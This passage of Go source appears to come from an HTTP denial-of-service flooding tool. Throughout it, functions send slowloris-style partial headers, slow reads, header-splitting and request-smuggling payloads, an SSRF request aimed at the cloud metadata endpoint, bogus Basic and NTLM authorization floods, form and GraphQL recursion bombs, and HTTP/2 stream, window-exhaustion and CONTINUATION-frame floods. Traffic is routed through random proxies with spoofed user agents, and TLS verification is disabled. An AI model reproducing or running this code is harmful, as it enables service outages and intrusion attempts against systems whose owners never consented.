        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    recordStatus("Sent")
    totalSuccess.Add(1)
    return nil
}

func httpGhostFlood(targetURL string, stop <-chan struct{}) error {
    u, err := url.Parse(targetURL)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    host := u.Hostname()
    port := u.Port()
    if port == "" {
        if u.Scheme == "https" {
            port = "443"
        } else {
            port = "80"
        }
    }
    addr := net.JoinHostPort(host, port)

    var rawConn net.Conn
    if len(proxyList) > 0 {
        proxy := proxyList[mrand.IntN(len(proxyList))]
        pURL, err := url.Parse(proxy)
        if err != nil {
            recordStatus("Err")
            totalErrors.Add(1)
            return err
        }
        rawConn, err = dialViaProxy("tcp", addr, pURL)
        if err != nil {
            recordStatus("Err")
            totalErrors.Add(1)
            return err
        }
    } else {
        rawConn, err = net.DialTimeout("tcp", addr, 5*time.Second)
        if err != nil {
            recordStatus("Err")
            totalErrors.Add(1)
            return err
        }
    }

    var conn net.Conn = rawConn
    if u.Scheme == "https" {
        tlsConn := tls.Client(rawConn, &tls.Config{ServerName: host, InsecureSkipVerify: true})
        if err := tlsConn.Handshake(); err != nil {
            rawConn.Close()
            recordStatus("Err")
            totalErrors.Add(1)
            return err
        }
        conn = tlsConn
    }
    defer conn.Close()

    payload := fmt.Sprintf("\r\n\r\n\r\n\r\n")
    _, err = conn.Write([]byte(payload))
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    recordStatus("Sent")
    totalSuccess.Add(1)
    return nil
}

func httpFragFlood(targetURL string, stop <-chan struct{}) error {
    u, err := url.Parse(targetURL)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    host := u.Hostname()
    port := u.Port()
    if port == "" {
        if u.Scheme == "https" {
            port = "443"
        } else {
            port = "80"
        }
    }
    addr := net.JoinHostPort(host, port)

    var rawConn net.Conn
    if len(proxyList) > 0 {
        proxy := proxyList[mrand.IntN(len(proxyList))]
        pURL, err := url.Parse(proxy)
        if err != nil {
            recordStatus("Err")
            totalErrors.Add(1)
            return err
        }
        rawConn, err = dialViaProxy("tcp", addr, pURL)
        if err != nil {
            recordStatus("Err")
            totalErrors.Add(1)
            return err
        }
    } else {
        rawConn, err = net.DialTimeout("tcp", addr, 5*time.Second)
        if err != nil {
            recordStatus("Err")
            totalErrors.Add(1)
            return err
        }
    }

    var conn net.Conn = rawConn
    if u.Scheme == "https" {
        tlsConn := tls.Client(rawConn, &tls.Config{ServerName: host, InsecureSkipVerify: true})
        if err := tlsConn.Handshake(); err != nil {
            rawConn.Close()
            recordStatus("Err")
            totalErrors.Add(1)
            return err
        }
        conn = tlsConn
    }
    defer conn.Close()

    reqStr := fmt.Sprintf("GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n", host, randUA())
    for i := 0; i < len(reqStr); i++ {
        _, err := conn.Write([]byte{reqStr[i]})
        if err != nil {
            recordStatus("Err")
            totalErrors.Add(1)
            return err
        }
        time.Sleep(time.Duration(100+mrand.IntN(400)) * time.Millisecond)
        if i%10 == 0 {
            recordStatus("Sent")
            totalSuccess.Add(1)
        }
    }
    return nil
}

func httpHeaderSplit(targetURL string, client *http.Client) error {
    payload := "foo\r\nContent-Length: 0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n"
    sep := "?"
    if strings.Contains(targetURL, "?") {
        sep = "&"
    }
    fullURL := targetURL + sep + "redirect=" + url.QueryEscape(payload)

    req, err := http.NewRequest("GET", fullURL, nil)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    req.Header.Set("User-Agent", randUA())
    req.Header.Set("Accept", "*/*")

    resp, err := client.Do(req)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    io.Copy(io.Discard, resp.Body)
    resp.Body.Close()
    recordStatus(strconv.Itoa(resp.StatusCode))
    totalSuccess.Add(1)
    return nil
}

func httpSSRFFlood(targetURL string, client *http.Client) error {
    body := fmt.Sprintf(`{"url":"http://169.254.169.254/latest/meta-data/%s","action":"fetch"}`, randString(20))
    fullURL := targetURL + "/api/fetch"

    req, err := http.NewRequest("POST", fullURL, strings.NewReader(body))
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    req.Header.Set("Content-Type", "application/json")
    req.Header.Set("Content-Length", strconv.Itoa(len(body)))
    req.Header.Set("User-Agent", randUA())

    resp, err := client.Do(req)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    io.Copy(io.Discard, resp.Body)
    resp.Body.Close()
    recordStatus(strconv.Itoa(resp.StatusCode))
    totalSuccess.Add(1)
    return nil
}

func httpSlowRead(targetURL string, client *http.Client, stop <-chan struct{}) error {
    req, err := http.NewRequest("GET", targetURL, nil)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    req.Header.Set("User-Agent", randUA())
    req.Header.Set("Accept", "*/*")

    cClient := *client
    cClient.Timeout = 0
    if t, ok := cClient.Transport.(*http.Transport); ok {
        tClone := t.Clone()
        tClone.ResponseHeaderTimeout = 0
        tClone.IdleConnTimeout = 0
        cClient.Transport = tClone
    }

    resp, err := cClient.Do(req)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    defer resp.Body.Close()
    recordStatus(strconv.Itoa(resp.StatusCode))

    buf := bufPool.Get().([]byte)
    defer bufPool.Put(buf)

    for {
        select {
        case <-stop:
            return nil
        default:
        }
        _, err := resp.Body.Read(buf)
        if err != nil {
            return nil
        }
        time.Sleep(time.Duration(1+mrand.IntN(5)) * time.Second)
        recordStatus("Held")
        totalSuccess.Add(1)
    }
}

func httpInvalidHeader(targetURL string, stop <-chan struct{}) error {
    u, err := url.Parse(targetURL)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    host := u.Hostname()
    port := u.Port()
    if port == "" {
        if u.Scheme == "https" {
            port = "443"
        } else {
            port = "80"
        }
    }
    addr := net.JoinHostPort(host, port)

    var rawConn net.Conn
    if len(proxyList) > 0 {
        proxy := proxyList[mrand.IntN(len(proxyList))]
        pURL, err := url.Parse(proxy)
        if err != nil {
            recordStatus("Err")
            totalErrors.Add(1)
            return err
        }
        rawConn, err = dialViaProxy("tcp", addr, pURL)
        if err != nil {
            recordStatus("Err")
            totalErrors.Add(1)
            return err
        }
    } else {
        rawConn, err = net.DialTimeout("tcp", addr, 5*time.Second)
        if err != nil {
            recordStatus("Err")
            totalErrors.Add(1)
            return err
        }
    }

    var conn net.Conn = rawConn
    if u.Scheme == "https" {
        tlsConn := tls.Client(rawConn, &tls.Config{ServerName: host, InsecureSkipVerify: true})
        if err := tlsConn.Handshake(); err != nil {
            rawConn.Close()
            recordStatus("Err")
            totalErrors.Add(1)
            return err
        }
        conn = tlsConn
    }
    defer conn.Close()

    payload := fmt.Sprintf("GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n%s: %s\r\n\r\n", host, randUA(), randString(10), randString(50))
    _, err = conn.Write([]byte(payload))
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    recordStatus("Sent")
    totalSuccess.Add(1)
    return nil
}

func httpRapidConnect(targetURL string, stop <-chan struct{}) error {
    u, err := url.Parse(targetURL)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    host := u.Hostname()
    port := u.Port()
    if port == "" {
        if u.Scheme == "https" {
            port = "443"
        } else {
            port = "80"
        }
    }
    addr := net.JoinHostPort(host, port)

    var conn net.Conn
    if len(proxyList) > 0 {
        proxy := proxyList[mrand.IntN(len(proxyList))]
        pURL, err := url.Parse(proxy)
        if err != nil {
            recordStatus("Err")
            totalErrors.Add(1)
            return err
        }
        conn, err = dialViaProxy("tcp", addr, pURL)
        if err != nil {
            recordStatus("Err")
            totalErrors.Add(1)
            return err
        }
    } else {
        conn, err = net.DialTimeout("tcp", addr, 5*time.Second)
        if err != nil {
            recordStatus("Err")
            totalErrors.Add(1)
            return err
        }
    }
    conn.Close()
    recordStatus("Sent")
    totalSuccess.Add(1)
    return nil
}

func httpAuthFlood(targetURL string, client *http.Client) error {
    req, err := http.NewRequest("GET", targetURL, nil)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    req.Header.Set("User-Agent", randUA())
    req.Header.Set("Accept", "*/*")
    req.Header.Set("Authorization", "Basic "+base64.StdEncoding.EncodeToString([]byte(randString(10)+":"+randString(10))))

    resp, err := client.Do(req)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    io.Copy(io.Discard, resp.Body)
    resp.Body.Close()
    recordStatus(strconv.Itoa(resp.StatusCode))
    totalSuccess.Add(1)
    return nil
}

func httpH2Flood(targetURL string, stop <-chan struct{}) error {
    u, err := url.Parse(targetURL)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    host := u.Hostname()
    port := u.Port()
    if port == "" {
        if u.Scheme == "https" {
            port = "443"
        } else {
            port = "80"
        }
    }
    addr := net.JoinHostPort(host, port)

    var rawConn net.Conn
    if len(proxyList) > 0 {
        proxy := proxyList[mrand.IntN(len(proxyList))]
        pURL, err := url.Parse(proxy)
        if err != nil {
            recordStatus("Err")
            totalErrors.Add(1)
            return err
        }
        rawConn, err = dialViaProxy("tcp", addr, pURL)
        if err != nil {
            recordStatus("Err")
            totalErrors.Add(1)
            return err
        }
    } else {
        rawConn, err = net.DialTimeout("tcp", addr, 5*time.Second)
        if err != nil {
            recordStatus("Err")
            totalErrors.Add(1)
            return err
        }
    }

    tlsConn := tls.Client(rawConn, &tls.Config{
        ServerName:         host,
        NextProtos:         []string{"h2"},
        InsecureSkipVerify: true,
    })
    if err := tlsConn.Handshake(); err != nil {
        rawConn.Close()
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    defer tlsConn.Close()

    if tlsConn.ConnectionState().NegotiatedProtocol != "h2" {
        recordStatus("Err")
        totalErrors.Add(1)
        return fmt.Errorf("h2 not negotiated")
    }

    if _, err := tlsConn.Write([]byte(http2.ClientPreface)); err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }

    bw := bufio.NewWriterSize(tlsConn, 65536)
    framer := http2.NewFramer(bw, tlsConn)
    framer.AllowIllegalWrites = true

    framer.WriteSettings(
        http2.Setting{ID: http2.SettingMaxConcurrentStreams, Val: 1000},
        http2.Setting{ID: http2.SettingInitialWindowSize, Val: 65535},
    )
    bw.Flush()

    connDone := make(chan struct{})
    go func() {
        defer close(connDone)
        for {
            f, err := framer.ReadFrame()
            if err != nil {
                return
            }
            switch sf := f.(type) {
            case *http2.SettingsFrame:
                if !sf.IsAck() {
                    framer.WriteSettingsAck()
                    bw.Flush()
                }
            case *http2.GoAwayFrame:
                return
            }
        }
    }()

    var hdrBuf bytes.Buffer
    enc := hpack.NewEncoder(&hdrBuf)
    path := u.RequestURI()
    if path == "" {
        path = "/"
    }
    scheme := u.Scheme
    if scheme == "" || scheme == "http" {
        scheme = "https"
    }
    authority := u.Host

    var streamID uint32 = 1
    for {
        select {
        case <-stop:
            return nil
        case <-connDone:
            recordStatus("Err")
            totalErrors.Add(1)
            return fmt.Errorf("connection closed by server")
        default:
        }

        hdrBuf.Reset()
        enc.WriteField(hpack.HeaderField{Name: ":method", Value: "POST"})
        enc.WriteField(hpack.HeaderField{Name: ":path", Value: path})
        enc.WriteField(hpack.HeaderField{Name: ":scheme", Value: scheme})
        enc.WriteField(hpack.HeaderField{Name: ":authority", Value: authority})
        enc.WriteField(hpack.HeaderField{Name: "user-agent", Value: randUA()})

        if err := framer.WriteHeaders(http2.HeadersFrameParam{
            StreamID:      streamID,
            BlockFragment: hdrBuf.Bytes(),
            EndStream:     false,
            EndHeaders:    true,
        }); err != nil {
            recordStatus("Err")
            totalErrors.Add(1)
            return err
        }

        data := []byte(randString(500))
        if err := framer.WriteData(streamID, true, data); err != nil {
            recordStatus("Err")
            totalErrors.Add(1)
            return err
        }

        recordStatus("Sent")
        totalSuccess.Add(1)
        streamID += 2

        if streamID >= 1<<31-1 {
            return nil
        }
    }
}

func httpJsonFlood(targetURL string, client *http.Client) error {
    body := fmt.Sprintf(`{"user":"%s","pass":"%s","token":"%s","data":[%s]}`,
        randString(20), randString(20), randString(32), randString(1000))
    req, err := http.NewRequest("POST", targetURL, strings.NewReader(body))
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    req.Header.Set("Content-Type", "application/json")
    req.Header.Set("Content-Length", strconv.Itoa(len(body)))
    req.Header.Set("User-Agent", randUA())

    resp, err := client.Do(req)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    io.Copy(io.Discard, resp.Body)
    resp.Body.Close()
    recordStatus(strconv.Itoa(resp.StatusCode))
    totalSuccess.Add(1)
    return nil
}

func httpMultipartFlood(targetURL string, client *http.Client) error {
    var buf bytes.Buffer
    writer := bufio.NewWriter(&buf)
    boundary := randString(30)
    fmt.Fprintf(writer, "--%s\r\n", boundary)
    fmt.Fprintf(writer, "Content-Disposition: form-data; name=\"file\"; filename=\"%s.txt\"\r\n", randString(10))
    fmt.Fprintf(writer, "Content-Type: text/plain\r\n\r\n")
    writer.WriteString(randString(10000))
    fmt.Fprintf(writer, "\r\n--%s--\r\n", boundary)
    writer.Flush()

    req, err := http.NewRequest("POST", targetURL, &buf)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    req.Header.Set("Content-Type", "multipart/form-data; boundary="+boundary)
    req.Header.Set("Content-Length", strconv.Itoa(buf.Len()))
    req.Header.Set("User-Agent", randUA())

    resp, err := client.Do(req)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    io.Copy(io.Discard, resp.Body)
    resp.Body.Close()
    recordStatus(strconv.Itoa(resp.StatusCode))
    totalSuccess.Add(1)
    return nil
}

func httpConnectionSmuggle(targetURL string, stop <-chan struct{}) error {
    u, err := url.Parse(targetURL)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    host := u.Hostname()
    port := u.Port()
    if port == "" {
        if u.Scheme == "https" {
            port = "443"
        } else {
            port = "80"
        }
    }
    addr := net.JoinHostPort(host, port)

    var rawConn net.Conn
    if len(proxyList) > 0 {
        proxy := proxyList[mrand.IntN(len(proxyList))]
        pURL, err := url.Parse(proxy)
        if err != nil {
            recordStatus("Err")
            totalErrors.Add(1)
            return err
        }
        rawConn, err = dialViaProxy("tcp", addr, pURL)
        if err != nil {
            recordStatus("Err")
            totalErrors.Add(1)
            return err
        }
    } else {
        rawConn, err = net.DialTimeout("tcp", addr, 5*time.Second)
        if err != nil {
            recordStatus("Err")
            totalErrors.Add(1)
            return err
        }
    }

    var conn net.Conn = rawConn
    if u.Scheme == "https" {
        tlsConn := tls.Client(rawConn, &tls.Config{ServerName: host, InsecureSkipVerify: true})
        if err := tlsConn.Handshake(); err != nil {
            rawConn.Close()
            recordStatus("Err")
            totalErrors.Add(1)
            return err
        }
        conn = tlsConn
    }
    defer conn.Close()

    payload := fmt.Sprintf("GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: keep-alive\r\n\r\n", host, randUA())
    for i := 0; i < 1000; i++ {
        _, err := conn.Write([]byte(payload))
        if err != nil {
            recordStatus("Err")
            totalErrors.Add(1)
            return err
        }
    }
    recordStatus("Sent")
    totalSuccess.Add(1)
    return nil
}

func httpLongHeader(targetURL string, stop <-chan struct{}) error {
    u, err := url.Parse(targetURL)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    host := u.Hostname()
    port := u.Port()
    if port == "" {
        if u.Scheme == "https" {
            port = "443"
        } else {
            port = "80"
        }
    }
    addr := net.JoinHostPort(host, port)

    var rawConn net.Conn
    if len(proxyList) > 0 {
        proxy := proxyList[mrand.IntN(len(proxyList))]
        pURL, err := url.Parse(proxy)
        if err != nil {
            recordStatus("Err")
            totalErrors.Add(1)
            return err
        }
        rawConn, err = dialViaProxy("tcp", addr, pURL)
        if err != nil {
            recordStatus("Err")
            totalErrors.Add(1)
            return err
        }
    } else {
        rawConn, err = net.DialTimeout("tcp", addr, 5*time.Second)
        if err != nil {
            recordStatus("Err")
            totalErrors.Add(1)
            return err
        }
    }

    var conn net.Conn = rawConn
    if u.Scheme == "https" {
        tlsConn := tls.Client(rawConn, &tls.Config{ServerName: host, InsecureSkipVerify: true})
        if err := tlsConn.Handshake(); err != nil {
            rawConn.Close()
            recordStatus("Err")
            totalErrors.Add(1)
            return err
        }
        conn = tlsConn
    }
    defer conn.Close()

    payload := fmt.Sprintf("GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n", host, randUA())
    for i := 0; i < 100; i++ {
        payload += "X-" + randString(5) + ": " + randString(100) + "\r\n"
    }
    payload += "\r\n"

    _, err = conn.Write([]byte(payload))
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    recordStatus("Sent")
    totalSuccess.Add(1)
    return nil
}

func httpCacheMaxAge(targetURL string, client *http.Client) error {
    req, err := http.NewRequest("GET", targetURL, nil)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    req.Header.Set("User-Agent", randUA())
    req.Header.Set("Cache-Control", "max-age=0, no-cache, no-store, must-revalidate")
    req.Header.Set("Pragma", "no-cache")

    resp, err := client.Do(req)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    io.Copy(io.Discard, resp.Body)
    resp.Body.Close()
    recordStatus(strconv.Itoa(resp.StatusCode))
    totalSuccess.Add(1)
    return nil
}

func httpDeadConn(targetURL string, client *http.Client, stop <-chan struct{}) error {
    req, err := http.NewRequest("GET", targetURL, nil)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    req.Header.Set("User-Agent", randUA())
    req.Header.Set("Connection", "keep-alive")

    cClient := *client
    cClient.Timeout = 0
    if t, ok := cClient.Transport.(*http.Transport); ok {
        tClone := t.Clone()
        tClone.ResponseHeaderTimeout = 0
        tClone.IdleConnTimeout = 0
        cClient.Transport = tClone
    }

    resp, err := cClient.Do(req)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    defer resp.Body.Close()
    recordStatus(strconv.Itoa(resp.StatusCode))

    time.Sleep(time.Duration(60+mrand.IntN(60)) * time.Second)
    return nil
}

func httpBadStart(targetURL string, stop <-chan struct{}) error {
    u, err := url.Parse(targetURL)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    host := u.Hostname()
    port := u.Port()
    if port == "" {
        if u.Scheme == "https" {
            port = "443"
        } else {
            port = "80"
        }
    }
    addr := net.JoinHostPort(host, port)

    var rawConn net.Conn
    if len(proxyList) > 0 {
        proxy := proxyList[mrand.IntN(len(proxyList))]
        pURL, err := url.Parse(proxy)
        if err != nil {
            recordStatus("Err")
            totalErrors.Add(1)
            return err
        }
        rawConn, err = dialViaProxy("tcp", addr, pURL)
        if err != nil {
            recordStatus("Err")
            totalErrors.Add(1)
            return err
        }
    } else {
        rawConn, err = net.DialTimeout("tcp", addr, 5*time.Second)
        if err != nil {
            recordStatus("Err")
            totalErrors.Add(1)
            return err
        }
    }

    var conn net.Conn = rawConn
    if u.Scheme == "https" {
        tlsConn := tls.Client(rawConn, &tls.Config{ServerName: host, InsecureSkipVerify: true})
        if err := tlsConn.Handshake(); err != nil {
            rawConn.Close()
            recordStatus("Err")
            totalErrors.Add(1)
            return err
        }
        conn = tlsConn
    }
    defer conn.Close()

    payload := fmt.Sprintf("GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n", host, randUA())
    _, err = conn.Write([]byte(payload))
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }

    ticker := time.NewTicker(1 + time.Duration(mrand.IntN(4))*time.Second)
    defer ticker.Stop()

    for {
        select {
        case <-stop:
            return nil
        case <-ticker.C:
            _, err := conn.Write([]byte("X: " + randString(5) + "\r\n"))
            if err != nil {
                recordStatus("Err")
                totalErrors.Add(1)
                return err
            }
            recordStatus("Sent")
            totalSuccess.Add(1)
        }
    }
}

func httpFormBomb(targetURL string, client *http.Client) error {
    var sb strings.Builder
    n := 1000 + mrand.IntN(5000)
    for i := 0; i < n; i++ {
        if i > 0 {
            sb.WriteByte('&')
        }
        sb.WriteString(randString(10))
        sb.WriteByte('=')
        sb.WriteString(randString(100))
    }
    body := sb.String()

    req, err := http.NewRequest("POST", targetURL, strings.NewReader(body))
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
    req.Header.Set("Content-Length", strconv.Itoa(len(body)))
    req.Header.Set("User-Agent", randUA())

    resp, err := client.Do(req)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    io.Copy(io.Discard, resp.Body)
    resp.Body.Close()
    recordStatus(strconv.Itoa(resp.StatusCode))
    totalSuccess.Add(1)
    return nil
}

func httpNTLMFlood(targetURL string, client *http.Client) error {
    req, err := http.NewRequest("GET", targetURL, nil)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    req.Header.Set("User-Agent", randUA())
    ntlmType1 := "TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw=="
    req.Header.Set("Authorization", "NTLM "+ntlmType1)

    resp, err := client.Do(req)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    io.Copy(io.Discard, resp.Body)
    resp.Body.Close()
    recordStatus(strconv.Itoa(resp.StatusCode))
    totalSuccess.Add(1)
    return nil
}

func httpEventStream(targetURL string, client *http.Client, stop <-chan struct{}) error {
    req, err := http.NewRequest("GET", targetURL, nil)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    req.Header.Set("User-Agent", randUA())
    req.Header.Set("Accept", "text/event-stream")

    cClient := *client
    cClient.Timeout = 0
    if t, ok := cClient.Transport.(*http.Transport); ok {
        tClone := t.Clone()
        tClone.ResponseHeaderTimeout = 0
        tClone.IdleConnTimeout = 0
        cClient.Transport = tClone
    }

    resp, err := cClient.Do(req)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    defer resp.Body.Close()
    recordStatus(strconv.Itoa(resp.StatusCode))

    buf := bufPool.Get().([]byte)
    defer bufPool.Put(buf)

    for {
        select {
        case <-stop:
            return nil
        default:
        }
        _, err := resp.Body.Read(buf)
        if err != nil {
            return nil
        }
        time.Sleep(time.Duration(500+mrand.IntN(1000)) * time.Millisecond)
        recordStatus("Held")
        totalSuccess.Add(1)
    }
}

func httpPollFlood(targetURL string, client *http.Client) error {
    sep := "?"
    if strings.Contains(targetURL, "?") {
        sep = "&"
    }
    fullURL := targetURL + sep + "t=" + strconv.FormatInt(time.Now().UnixNano(), 10)

    req, err := http.NewRequest("GET", fullURL, nil)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    req.Header.Set("User-Agent", randUA())
    req.Header.Set("Accept", "application/json")

    resp, err := client.Do(req)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    io.Copy(io.Discard, resp.Body)
    resp.Body.Close()
    recordStatus(strconv.Itoa(resp.StatusCode))
    totalSuccess.Add(1)
    return nil
}

func httpPayloadFlood(targetURL string, client *http.Client) error {
    body := randString(10000)
    req, err := http.NewRequest("POST", targetURL, strings.NewReader(body))
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    req.Header.Set("Content-Type", "application/octet-stream")
    req.Header.Set("Content-Length", strconv.Itoa(len(body)))
    req.Header.Set("User-Agent", randUA())

    resp, err := client.Do(req)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    io.Copy(io.Discard, resp.Body)
    resp.Body.Close()
    recordStatus(strconv.Itoa(resp.StatusCode))
    totalSuccess.Add(1)
    return nil
}

func httpH2WindowExhaust(targetURL string, stop <-chan struct{}) error {
    u, err := url.Parse(targetURL)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    host := u.Hostname()
    port := u.Port()
    if port == "" {
        if u.Scheme == "https" {
            port = "443"
        } else {
            port = "80"
        }
    }
    addr := net.JoinHostPort(host, port)

    rawConn, err := net.DialTimeout("tcp", addr, 5*time.Second)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }

    tlsConn := tls.Client(rawConn, &tls.Config{
        ServerName:         host,
        NextProtos:         []string{"h2"},
        InsecureSkipVerify: true,
    })
    if err := tlsConn.Handshake(); err != nil {
        rawConn.Close()
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    defer tlsConn.Close()

    if tlsConn.ConnectionState().NegotiatedProtocol != "h2" {
        recordStatus("Err")
        totalErrors.Add(1)
        return fmt.Errorf("h2 not negotiated")
    }

    bw := bufio.NewWriterSize(tlsConn, 1<<20)
    framer := http2.NewFramer(bw, tlsConn)
    framer.AllowIllegalWrites = true

    framer.WriteSettings(
        http2.Setting{ID: http2.SettingInitialWindowSize, Val: 1},
        http2.Setting{ID: http2.SettingMaxConcurrentStreams, Val: 1000},
    )
    bw.Flush()

    var streamID uint32 = 1
    var hdrBuf bytes.Buffer
    enc := hpack.NewEncoder(&hdrBuf)
    path := u.RequestURI()
    if path == "" {
        path = "/"
    }

    for i := 0; i < 1000; i++ {
        select {
        case <-stop:
            return nil
        default:
        }

        hdrBuf.Reset()
        enc.WriteField(hpack.HeaderField{Name: ":method", Value: "POST"})
        enc.WriteField(hpack.HeaderField{Name: ":path", Value: path})
        enc.WriteField(hpack.HeaderField{Name: ":scheme", Value: "https"})
        enc.WriteField(hpack.HeaderField{Name: ":authority", Value: u.Host})
        enc.WriteField(hpack.HeaderField{Name: "content-length", Value: "1048576"})

        if err := framer.WriteHeaders(http2.HeadersFrameParam{
            StreamID:      streamID,
            BlockFragment: hdrBuf.Bytes(),
            EndStream:     false,
            EndHeaders:    true,
        }); err != nil {
            return err
        }

        if err := framer.WriteData(streamID, false, []byte{'A'}); err != nil {
            return err
        }

        streamID += 2
    }
    bw.Flush()

    <-stop
    return nil
}

func httpGraphQLDeepRecursion(targetURL string, client *http.Client) error {
    fullURL := targetURL + "/api/graphql"
    var sb strings.Builder
    depth := 1000

    sb.WriteString(`{"query":"query {`)
    for i := 0; i < depth; i++ {
        sb.WriteString(`user(id: 1) { `)
    }
    sb.WriteString(`id name `)
    for i := 0; i < depth; i++ {
        sb.WriteString(`} `)
    }
    sb.WriteString(`}"}`)

    body := sb.String()

    req, err := http.NewRequest("POST", fullURL, strings.NewReader(body))
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }

    req.Header.Set("Content-Type", "application/json")
    req.Header.Set("Content-Length", strconv.Itoa(len(body)))
    req.Header.Set("User-Agent", randUA())
    req.Header.Set("Accept", "application/json")
    req.Header.Set("Connection", "keep-alive")

    resp, err := client.Do(req)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    io.Copy(io.Discard, resp.Body)
    resp.Body.Close()

    recordStatus(strconv.Itoa(resp.StatusCode))
    totalSuccess.Add(1)
    return nil
}

func httpH2ContinuationBomb(targetURL string, stop <-chan struct{}) error {
    u, err := url.Parse(targetURL)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    host := u.Hostname()
    port := u.Port()
    if port == "" {
        if u.Scheme == "https" {
            port = "443"
        } else {
            port = "80"
        }
    }
    addr := net.JoinHostPort(host, port)

    rawConn, err := net.DialTimeout("tcp", addr, 5*time.Second)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }

    tlsConn := tls.Client(rawConn, &tls.Config{
        ServerName:         host,
        NextProtos:         []string{"h2"},
        InsecureSkipVerify: true,
    })
    if err := tlsConn.Handshake(); err != nil {
        rawConn.Close()
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    defer tlsConn.Close()

    if _, err := tlsConn.Write([]byte(http2.ClientPreface)); err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }

    bw := bufio.NewWriterSize(tlsConn, 1<<20)
    framer := http2.NewFramer(bw, tlsConn)
    framer.AllowIllegalWrites = true

    framer.WriteSettings(http2.Setting{ID: http2.SettingMaxFrameSize, Val: 16384})
    bw.Flush()

    var hdrBuf bytes.Buffer
    enc := hpack.NewEncoder(&hdrBuf)
    path := u.RequestURI()
    if path == "" {
        path = "/"
    }

    var streamID uint32 = 1
    junkHeaders := make([]byte, 16000)
    for i := range junkHeaders {
        junkHeaders[i] = 'A'
    }

    for {
        select {
        case <-stop:
            return nil
        default:
        }

        hdrBuf.Reset()
        enc.WriteField(hpack.HeaderField{Name: ":method", Value: "POST"})
        enc.WriteField(hpack.HeaderField{Name: ":path", Value: path})
        enc.WriteField(hpack.HeaderField{Name: ":scheme", Value: "https"})
        enc.WriteField(hpack.HeaderField{Name: ":authority", Value: u.Host})

        if err := framer.WriteHeaders(http2.HeadersFrameParam{
            StreamID:      streamID,
            BlockFragment: hdrBuf.Bytes(),
            EndStream:     false,
            EndHeaders:    false,
        }); err != nil {
            return err
        }

        for i := 0; i < 50; i++ {
            if err := framer.WriteContinuation(streamID, false, junkHeaders); err != nil {
                return err
            }
        }
        bw.Flush()

        recordStatus("Sent")
        totalSuccess.Add(1)
        streamID += 2

        if streamID >= 1<<31-1 {
            return nil
        }
    }
}

func httpMixHeavy(targetURL string, client *http.Client) error {
    var sb strings.Builder
    depth := 100 + mrand.IntN(200)

